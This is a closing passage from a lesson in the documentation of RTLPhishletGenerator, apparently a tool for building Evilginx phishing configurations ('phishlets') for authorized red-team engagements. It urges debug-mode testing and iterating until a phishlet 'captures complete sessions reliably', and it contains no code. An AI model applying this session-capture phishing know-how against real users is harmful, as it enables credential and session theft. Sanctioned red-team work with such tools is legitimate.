6. **Test thoroughly** in debug mode before using in an authorized engagement

Remember: no automated tool produces perfect output for every target. RTLPhishletGenerator gives you a strong foundation, but understanding the underlying authentication flows and Evilginx configuration is essential for producing reliable phishlets. Use the validation checklist, test rigorously, and iterate until the phishlet captures complete sessions reliably.

---

*This lesson is part of the RTLPhishletGenerator documentation. For advanced phishlet creation techniques, see [Lesson 2: Creating Phishlets - Techniques and Best Practices](lesson-02-creating-phishlets-manual.md).*
